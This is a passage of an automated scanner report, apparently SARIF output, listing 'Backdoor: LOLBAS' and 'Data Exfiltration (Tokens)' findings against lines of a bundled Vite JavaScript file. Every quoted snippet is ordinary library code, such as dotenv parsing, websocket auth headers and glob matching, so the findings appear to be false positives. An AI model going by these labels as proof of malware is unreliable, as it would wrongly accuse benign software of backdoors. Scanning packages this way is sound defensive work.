                    "text": "     * @deprecated - Encoding may only be set at instantiation time\n     */\n    setEncoding(_enc) {\n        throw new Error('Encoding must be set at instantiation time');\n    }\n    /**\n     * True if this is an objectMode stream\n",
                    "rendered": {
                      "text": "     * @deprecated - Encoding may only be set at instantiation time\n     */\n    setEncoding(_enc) {\n        throw new Error('Encoding must be set at instantiation time');\n    }\n    /**\n     * True if this is an objectMode stream\n",
                      "markdown": "`     * @deprecated - Encoding may only be set at instantiation time\n     */\n    setEncoding(_enc) {\n        throw new Error('Encoding must be set at instantiation time');\n    }\n    /**\n     * True if this is an objectMode stream\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 6727,
                  "startColumn": 45,
                  "endLine": 6727,
                  "endColumn": 49,
                  "snippet": {
                    "text": "     * @deprecated - This is a read only property\n     */\n    set encoding(_enc) {\n        throw new Error('Encoding must be set at instantiation time');\n    }\n    /**\n     * @deprecated - Encoding may only be set at instantiation time\n",
                    "rendered": {
                      "text": "     * @deprecated - This is a read only property\n     */\n    set encoding(_enc) {\n        throw new Error('Encoding must be set at instantiation time');\n    }\n    /**\n     * @deprecated - Encoding may only be set at instantiation time\n",
                      "markdown": "`     * @deprecated - This is a read only property\n     */\n    set encoding(_enc) {\n        throw new Error('Encoding must be set at instantiation time');\n    }\n    /**\n     * @deprecated - Encoding may only be set at instantiation time\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 4634,
                  "startColumn": 34,
                  "endLine": 4634,
                  "endColumn": 38,
                  "snippet": {
                    "text": "                var fr = fi;\n                var pr = pi + 1;\n                if (pr === pl) {\n                    this.debug('** at the end');\n                    // a ** at the end will just swallow the rest.\n                    // We have found a match.\n                    // however, it will not swallow /.x, unless\n",
                    "rendered": {
                      "text": "                var fr = fi;\n                var pr = pi + 1;\n                if (pr === pl) {\n                    this.debug('** at the end');\n                    // a ** at the end will just swallow the rest.\n                    // We have found a match.\n                    // however, it will not swallow /.x, unless\n",
                      "markdown": "`                var fr = fi;\n                var pr = pi + 1;\n                if (pr === pl) {\n                    this.debug('** at the end');\n                    // a ** at the end will just swallow the rest.\n                    // We have found a match.\n                    // however, it will not swallow /.x, unless\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 61387,
                  "startColumn": 49,
                  "endLine": 61387,
                  "endColumn": 57,
                  "snippet": {
                    "text": "nnections>\n   *    changeOrigin: <true/false, Default: false - changes the origin of the host header to the target URL>\n   *    preserveHeaderKeyCase: <true/false, Default: false - specify whether you want to keep letter case of response header key >\n   *    auth   : Basic authentication i.e. 'user:password' to compute an Authorization header.\n   *    hostRewrite: rewrites the location hostname on (201/301/302/307/308) redirects, Default: null.\n   *    autoRewrite: rewrites the location host/port on (201/301/302/307/308) redirects based on requested host/port. Default: false.\n   *    protocolRewrite: ",
                    "rendered": {
                      "text": "nnections>\n   *    changeOrigin: <true/false, Default: false - changes the origin of the host header to the target URL>\n   *    preserveHeaderKeyCase: <true/false, Default: false - specify whether you want to keep letter case of response header key >\n   *    auth   : Basic authentication i.e. 'user:password' to compute an Authorization header.\n   *    hostRewrite: rewrites the location hostname on (201/301/302/307/308) redirects, Default: null.\n   *    autoRewrite: rewrites the location host/port on (201/301/302/307/308) redirects based on requested host/port. Default: false.\n   *    protocolRewrite: ",
                      "markdown": "`nnections>\n   *    changeOrigin: <true/false, Default: false - changes the origin of the host header to the target URL>\n   *    preserveHeaderKeyCase: <true/false, Default: false - specify whether you want to keep letter case of response header key >\n   *    auth   : Basic authentication i.e. 'user:password' to compute an Authorization header.\n   *    hostRewrite: rewrites the location hostname on (201/301/302/307/308) redirects, Default: null.\n   *    autoRewrite: rewrites the location host/port on (201/301/302/307/308) redirects based on requested host/port. Default: false.\n   *    protocolRewrite: `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57872,
                  "startColumn": 51,
                  "endLine": 57872,
                  "endColumn": 59,
                  "snippet": {
                    "text": "    }\n  }\n  if (parsedUrl.username || parsedUrl.password) {\n    opts.auth = `${parsedUrl.username}:${parsedUrl.password}`;\n  }\n\n  if (isIpcUrl) {\n",
                    "rendered": {
                      "text": "    }\n  }\n  if (parsedUrl.username || parsedUrl.password) {\n    opts.auth = `${parsedUrl.username}:${parsedUrl.password}`;\n  }\n\n  if (isIpcUrl) {\n",
                      "markdown": "`    }\n  }\n  if (parsedUrl.username || parsedUrl.password) {\n    opts.auth = `${parsedUrl.username}:${parsedUrl.password}`;\n  }\n\n  if (isIpcUrl) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57871,
                  "startColumn": 38,
                  "endLine": 57871,
                  "endColumn": 46,
                  "snippet": {
                    "text": "      opts.headers.Origin = opts.origin;\n    }\n  }\n  if (parsedUrl.username || parsedUrl.password) {\n    opts.auth = `${parsedUrl.username}:${parsedUrl.password}`;\n  }\n\n",
                    "rendered": {
                      "text": "      opts.headers.Origin = opts.origin;\n    }\n  }\n  if (parsedUrl.username || parsedUrl.password) {\n    opts.auth = `${parsedUrl.username}:${parsedUrl.password}`;\n  }\n\n",
                      "markdown": "`      opts.headers.Origin = opts.origin;\n    }\n  }\n  if (parsedUrl.username || parsedUrl.password) {\n    opts.auth = `${parsedUrl.username}:${parsedUrl.password}`;\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34784,
                  "startColumn": 48,
                  "endLine": 34784,
                  "endColumn": 56,
                  "snippet": {
                    "text": "        if (processEnv[key] === parsed[key]) {\n          return processEnv[key]\n        } else {\n          // scenario: PASSWORD_EXPAND_NESTED=${PASSWORD_EXPAND}\n          return interpolate(processEnv[key], processEnv, parsed)\n        }\n      }\n",
                    "rendered": {
                      "text": "        if (processEnv[key] === parsed[key]) {\n          return processEnv[key]\n        } else {\n          // scenario: PASSWORD_EXPAND_NESTED=${PASSWORD_EXPAND}\n          return interpolate(processEnv[key], processEnv, parsed)\n        }\n      }\n",
                      "markdown": "`        if (processEnv[key] === parsed[key]) {\n          return processEnv[key]\n        } else {\n          // scenario: PASSWORD_EXPAND_NESTED=${PASSWORD_EXPAND}\n          return interpolate(processEnv[key], processEnv, parsed)\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34784,
                  "startColumn": 23,
                  "endLine": 34784,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        if (processEnv[key] === parsed[key]) {\n          return processEnv[key]\n        } else {\n          // scenario: PASSWORD_EXPAND_NESTED=${PASSWORD_EXPAND}\n          return interpolate(processEnv[key], processEnv, parsed)\n        }\n      }\n",
                    "rendered": {
                      "text": "        if (processEnv[key] === parsed[key]) {\n          return processEnv[key]\n        } else {\n          // scenario: PASSWORD_EXPAND_NESTED=${PASSWORD_EXPAND}\n          return interpolate(processEnv[key], processEnv, parsed)\n        }\n      }\n",
                      "markdown": "`        if (processEnv[key] === parsed[key]) {\n          return processEnv[key]\n        } else {\n          // scenario: PASSWORD_EXPAND_NESTED=${PASSWORD_EXPAND}\n          return interpolate(processEnv[key], processEnv, parsed)\n        }\n      }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 34531,
                  "startColumn": 18,
                  "endLine": 34531,
                  "endColumn": 26,
                  "snippet": {
                    "text": "  }\n\n  // Get decrypt key\n  const key = uri.password;\n  if (!key) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing key part');\n    err.code = 'INVALID_DOTENV_KEY';\n",
                    "rendered": {
                      "text": "  }\n\n  // Get decrypt key\n  const key = uri.password;\n  if (!key) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing key part');\n    err.code = 'INVALID_DOTENV_KEY';\n",
                      "markdown": "`  }\n\n  // Get decrypt key\n  const key = uri.password;\n  if (!key) {\n    const err = new Error('INVALID_DOTENV_KEY: Missing key part');\n    err.code = 'INVALID_DOTENV_KEY';\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 14548,
                  "startColumn": 11,
                  "endLine": 14548,
                  "endColumn": 19,
                  "snippet": {
                    "text": "/**\n * Matches the parts of a URL:\n * 1. Scheme, including \":\", guaranteed.\n * 2. User/password, including \"@\", optional.\n * 3. Host, guaranteed.\n * 4. Port, including \":\", optional.\n * 5. Path, including \"/\", optional.\n",
                    "rendered": {
                      "text": "/**\n * Matches the parts of a URL:\n * 1. Scheme, including \":\", guaranteed.\n * 2. User/password, including \"@\", optional.\n * 3. Host, guaranteed.\n * 4. Port, including \":\", optional.\n * 5. Path, including \"/\", optional.\n",
                      "markdown": "`/**\n * Matches the parts of a URL:\n * 1. Scheme, including \":\", guaranteed.\n * 2. User/password, including \"@\", optional.\n * 3. Host, guaranteed.\n * 4. Port, including \":\", optional.\n * 5. Path, including \"/\", optional.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 66343,
                  "startColumn": 38,
                  "endLine": 66343,
                  "endColumn": 44,
                  "snippet": {
                    "text": "    resolved.logger.warn(\n      colors$1.yellow(`\n(!) Experimental legacy.buildSsrCjsExternalHeuristics and ssr.format were be removed in Vite 5.\n    The only SSR Output format is ESM. Find more information at https://github.com/vitejs/vite/discussions/13816.\n`)\n    );\n  }\n",
                    "rendered": {
                      "text": "    resolved.logger.warn(\n      colors$1.yellow(`\n(!) Experimental legacy.buildSsrCjsExternalHeuristics and ssr.format were be removed in Vite 5.\n    The only SSR Output format is ESM. Find more information at https://github.com/vitejs/vite/discussions/13816.\n`)\n    );\n  }\n",
                      "markdown": "`    resolved.logger.warn(\n      colors$1.yellow(`\n(!) Experimental legacy.buildSsrCjsExternalHeuristics and ssr.format were be removed in Vite 5.\n    The only SSR Output format is ESM. Find more information at https://github.com/vitejs/vite/discussions/13816.\n`)\n    );\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 65304,
                  "startColumn": 13,
                  "endLine": 65304,
                  "endColumn": 20,
                  "snippet": {
                    "text": "        resolvedOutDirs,\n        emptyOutDir\n      );\n      const { watch } = await import('rollup');\n      const watcher = watch({\n        ...rollupOptions,\n        output: normalizedOutputs,\n",
                    "rendered": {
                      "text": "        resolvedOutDirs,\n        emptyOutDir\n      );\n      const { watch } = await import('rollup');\n      const watcher = watch({\n        ...rollupOptions,\n        output: normalizedOutputs,\n",
                      "markdown": "`        resolvedOutDirs,\n        emptyOutDir\n      );\n      const { watch } = await import('rollup');\n      const watcher = watch({\n        ...rollupOptions,\n        output: normalizedOutputs,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 63851,
                  "startColumn": 11,
                  "endLine": 63851,
                  "endColumn": 16,
                  "snippet": {
                    "text": "          userDefineEnv[key.slice(16)] = config.define[key];\n        }\n      }\n      const env = `import.meta.env = ${serializeDefine({\n        ...importMetaEnvKeys,\n        SSR: \"__vite_ssr__\",\n        ...userDefineEnv\n",
                    "rendered": {
                      "text": "          userDefineEnv[key.slice(16)] = config.define[key];\n        }\n      }\n      const env = `import.meta.env = ${serializeDefine({\n        ...importMetaEnvKeys,\n        SSR: \"__vite_ssr__\",\n        ...userDefineEnv\n",
                      "markdown": "`          userDefineEnv[key.slice(16)] = config.define[key];\n        }\n      }\n      const env = `import.meta.env = ${serializeDefine({\n        ...importMetaEnvKeys,\n        SSR: \"__vite_ssr__\",\n        ...userDefineEnv\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 61218,
                  "startColumn": 8,
                  "endLine": 61218,
                  "endColumn": 14,
                  "snippet": {
                    "text": "\t      }\n\n\t      if(args[cntr] instanceof Buffer) {\n\t        head = args[cntr];\n\t      }\n\n\t      /* optional args parse end */\n",
                    "rendered": {
                      "text": "\t      }\n\n\t      if(args[cntr] instanceof Buffer) {\n\t        head = args[cntr];\n\t      }\n\n\t      /* optional args parse end */\n",
                      "markdown": "`\t      }\n\n\t      if(args[cntr] instanceof Buffer) {\n\t        head = args[cntr];\n\t      }\n\n\t      /* optional args parse end */\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57929,
                  "startColumn": 12,
                  "endLine": 57929,
                  "endColumn": 18,
                  "snippet": {
                    "text": "    }\n\n    //\n    // Match curl 7.77.0 behavior and make the first `Authorization` header win.\n    // If the `Authorization` header is set, then there is nothing to do as it\n    // will take precedence.\n    //\n",
                    "rendered": {
                      "text": "    }\n\n    //\n    // Match curl 7.77.0 behavior and make the first `Authorization` header win.\n    // If the `Authorization` header is set, then there is nothing to do as it\n    // will take precedence.\n    //\n",
                      "markdown": "`    }\n\n    //\n    // Match curl 7.77.0 behavior and make the first `Authorization` header win.\n    // If the `Authorization` header is set, then there is nothing to do as it\n    // will take precedence.\n    //\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 57916,
                  "startColumn": 16,
                  "endLine": 57916,
                  "endColumn": 22,
                  "snippet": {
                    "text": "\n      if (!isSameHost || (websocket._originalSecure && !isSecure)) {\n        //\n        // Match curl 7.77.0 behavior and drop the following headers. These\n        // headers are also dropped when following a redirect to a subdomain.\n        //\n        delete opts.headers.authorization;\n",
                    "rendered": {
                      "text": "\n      if (!isSameHost || (websocket._originalSecure && !isSecure)) {\n        //\n        // Match curl 7.77.0 behavior and drop the following headers. These\n        // headers are also dropped when following a redirect to a subdomain.\n        //\n        delete opts.headers.authorization;\n",
                      "markdown": "`\n      if (!isSameHost || (websocket._originalSecure && !isSecure)) {\n        //\n        // Match curl 7.77.0 behavior and drop the following headers. These\n        // headers are also dropped when following a redirect to a subdomain.\n        //\n        delete opts.headers.authorization;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 54062,
                  "startColumn": 3,
                  "endLine": 54062,
                  "endColumn": 11,
                  "snippet": {
                    "text": "      logger.error(\n        colors$1.red(\n          `\nThe script specified as BROWSER environment variable failed.\n\n${colors$1.cyan(\n            scriptPath\n",
                    "rendered": {
                      "text": "      logger.error(\n        colors$1.red(\n          `\nThe script specified as BROWSER environment variable failed.\n\n${colors$1.cyan(\n            scriptPath\n",
                      "markdown": "`      logger.error(\n        colors$1.red(\n          `\nThe script specified as BROWSER environment variable failed.\n\n${colors$1.cyan(\n            scriptPath\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 54002,
                  "startColumn": 5,
                  "endLine": 54002,
                  "endColumn": 9,
                  "snippet": {
                    "text": "    notFoundError,\n};\n\nconst cp = require$$2$1;\nconst parse$3 = parse_1;\nconst enoent = enoent$1;\n\n",
                    "rendered": {
                      "text": "    notFoundError,\n};\n\nconst cp = require$$2$1;\nconst parse$3 = parse_1;\nconst enoent = enoent$1;\n\n",
                      "markdown": "`    notFoundError,\n};\n\nconst cp = require$$2$1;\nconst parse$3 = parse_1;\nconst enoent = enoent$1;\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53739,
                  "startColumn": 34,
                  "endLine": 53739,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n    try {\n        resolved = which.sync(parsed.command, {\n            path: env[getPathKey({ env })],\n            pathExt: withoutPathExt ? path$1.delimiter : undefined,\n        });\n    } catch (e) {\n",
                    "rendered": {
                      "text": "\n    try {\n        resolved = which.sync(parsed.command, {\n            path: env[getPathKey({ env })],\n            pathExt: withoutPathExt ? path$1.delimiter : undefined,\n        });\n    } catch (e) {\n",
                      "markdown": "`\n    try {\n        resolved = which.sync(parsed.command, {\n            path: env[getPathKey({ env })],\n            pathExt: withoutPathExt ? path$1.delimiter : undefined,\n        });\n    } catch (e) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53719,
                  "startColumn": 9,
                  "endLine": 53719,
                  "endColumn": 14,
                  "snippet": {
                    "text": "const getPathKey = pathKeyExports;\n\nfunction resolveCommandAttempt(parsed, withoutPathExt) {\n    const env = parsed.options.env || process.env;\n    const cwd = process.cwd();\n    const hasCustomCwd = parsed.options.cwd != null;\n    // Worker threads do not have process.chdir()\n",
                    "rendered": {
                      "text": "const getPathKey = pathKeyExports;\n\nfunction resolveCommandAttempt(parsed, withoutPathExt) {\n    const env = parsed.options.env || process.env;\n    const cwd = process.cwd();\n    const hasCustomCwd = parsed.options.cwd != null;\n    // Worker threads do not have process.chdir()\n",
                      "markdown": "`const getPathKey = pathKeyExports;\n\nfunction resolveCommandAttempt(parsed, withoutPathExt) {\n    const env = parsed.options.env || process.env;\n    const cwd = process.cwd();\n    const hasCustomCwd = parsed.options.cwd != null;\n    // Worker threads do not have process.chdir()\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 53118,
                  "startColumn": 21,
                  "endLine": 53118,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n\treturn async function () {\n\t\tif (mountPoint) {\n\t\t\t// Return memoized mount point value\n\t\t\treturn mountPoint;\n\t\t}\n\n",
                    "rendered": {
                      "text": "\n\treturn async function () {\n\t\tif (mountPoint) {\n\t\t\t// Return memoized mount point value\n\t\t\treturn mountPoint;\n\t\t}\n\n",
                      "markdown": "`\n\treturn async function () {\n\t\tif (mountPoint) {\n\t\t\t// Return memoized mount point value\n\t\t\treturn mountPoint;\n\t\t}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52946,
                  "startColumn": 15,
                  "endLine": 52946,
                  "endColumn": 21,
                  "snippet": {
                    "text": "    );\n    if (!resolved) {\n      const err = new Error(\n        `Cannot find module '${id}' imported from '${importer}'`\n      );\n      err.code = \"ERR_MODULE_NOT_FOUND\";\n      throw err;\n",
                    "rendered": {
                      "text": "    );\n    if (!resolved) {\n      const err = new Error(\n        `Cannot find module '${id}' imported from '${importer}'`\n      );\n      err.code = \"ERR_MODULE_NOT_FOUND\";\n      throw err;\n",
                      "markdown": "`    );\n    if (!resolved) {\n      const err = new Error(\n        `Cannot find module '${id}' imported from '${importer}'`\n      );\n      err.code = \"ERR_MODULE_NOT_FOUND\";\n      throw err;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52656,
                  "startColumn": 34,
                  "endLine": 52656,
                  "endColumn": 40,
                  "snippet": {
                    "text": "  }\n  return true;\n}\nconst isStaticProperty = (node) => node && node.type === \"Property\" && !node.computed;\nconst isStaticPropertyKey = (node, parent) => isStaticProperty(parent) && parent.key === node;\nconst functionNodeTypeRE = /Function(?:Expression|Declaration)$|Method$/;\nfunction isFunction$1(node) {\n",
                    "rendered": {
                      "text": "  }\n  return true;\n}\nconst isStaticProperty = (node) => node && node.type === \"Property\" && !node.computed;\nconst isStaticPropertyKey = (node, parent) => isStaticProperty(parent) && parent.key === node;\nconst functionNodeTypeRE = /Function(?:Expression|Declaration)$|Method$/;\nfunction isFunction$1(node) {\n",
                      "markdown": "`  }\n  return true;\n}\nconst isStaticProperty = (node) => node && node.type === \"Property\" && !node.computed;\nconst isStaticPropertyKey = (node, parent) => isStaticProperty(parent) && parent.key === node;\nconst functionNodeTypeRE = /Function(?:Expression|Declaration)$|Method$/;\nfunction isFunction$1(node) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52609,
                  "startColumn": 54,
                  "endLine": 52609,
                  "endColumn": 60,
                  "snippet": {
                    "text": "      }\n    },\n    leave(node, parent) {\n      if (parent && !(parent.type === \"IfStatement\" && node === parent.alternate)) {\n        parentStack.shift();\n      }\n      if (node.type === \"VariableDeclaration\") {\n",
                    "rendered": {
